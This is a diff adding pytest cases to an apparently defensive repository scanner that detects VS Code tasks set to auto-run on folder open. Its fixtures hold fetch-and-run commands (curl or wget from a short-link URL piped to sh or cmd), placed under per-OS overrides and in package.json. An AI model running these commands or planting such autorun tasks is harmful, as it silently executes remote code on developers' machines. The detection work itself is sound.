@@ -227,6 +227,58 @@ def test_vscode_task_manual_build_does_not_confirm(tmp_path):
     assert not analyze_repo(tmp_path, "legit/app").confirmed
 
 
+def test_vscode_task_per_os_command_autorun_confirms(tmp_path):
+    # icecoldjay/bri: the fetch-and-run hides under per-OS overrides
+    # (osx/linux/windows command), NOT a top-level command, and auto-runs on
+    # folderOpen. Reading only the top-level command missed it entirely.
+    vs = tmp_path / ".vscode"
+    vs.mkdir()
+    (vs / "tasks.json").write_text(
+        json.dumps({"version": "2.0.0", "tasks": [{
+            "label": "vscode", "type": "shell",
+            "osx": {"command": "curl 'https://PEsnCV.short.gy/trJnMn9m' -L | sh"},
+            "linux": {"command": "wget -qO- 'https://PEsnCV.short.gy/trJnMn9l' -L | sh"},
+            "windows": {"command": "curl https://PEsnCV.short.gy/trJnMn9w -L | cmd"},
+            "runOptions": {"runOn": "folderOpen"}}]}),
+        encoding="utf-8",
+    )
+    res = analyze_repo(tmp_path, "icecoldjay/bri")
+    assert res.confirmed
+    assert any(f.rule == "vscode-autorun" for f in res.bash_findings)
+
+
+def test_vscode_task_embedded_in_package_json_confirms(tmp_path):
+    # The same auto-run task can live in package.json (not only .vscode/tasks.json);
+    # it must still confirm. This is where bri hid its second-stage payload.
+    (tmp_path / "package.json").write_text(
+        json.dumps({"name": "bri", "version": "1.0.0", "tasks": [{
+            "label": "vscode", "type": "shell",
+            "osx": {"command": "curl 'https://PEsnCV.short.gy/trJnMn9m' -L | sh"},
+            "linux": {"command": "wget -qO- 'https://PEsnCV.short.gy/trJnMn9l' -L | sh"},
+            "runOptions": {"runOn": "folderOpen"}}]}),
+        encoding="utf-8",
+    )
+    findings = scan_manifests(tmp_path)
+    assert any(f.rule == "vscode-autorun" and f.category == "install_hook"
+               for f in findings)
+    assert analyze_repo(tmp_path, "icecoldjay/bri").confirmed
+
+
+def test_vscode_task_per_os_manual_does_not_confirm(tmp_path):
+    # A per-OS task that is NOT folderOpen (manual build) stays benign: the
+    # auto-run trigger is the tell, not the platform overrides themselves.
+    vs = tmp_path / ".vscode"
+    vs.mkdir()
+    (vs / "tasks.json").write_text(
+        json.dumps({"version": "2.0.0", "tasks": [{
+            "label": "build", "type": "shell",
+            "osx": {"command": "npm run build"},
+            "windows": {"command": "npm run build"}}]}),
+        encoding="utf-8",
+    )
+    assert not analyze_repo(tmp_path, "legit/app").confirmed
+
+
 def test_test_fixture_files_excluded_from_confirmation(tmp_path):
     # The crewhaus FP: a prompt-injection DETECTOR's `index.test.ts` cites
     # webhook.site / telegram as fixtures. Test/fixture data is not the payload.
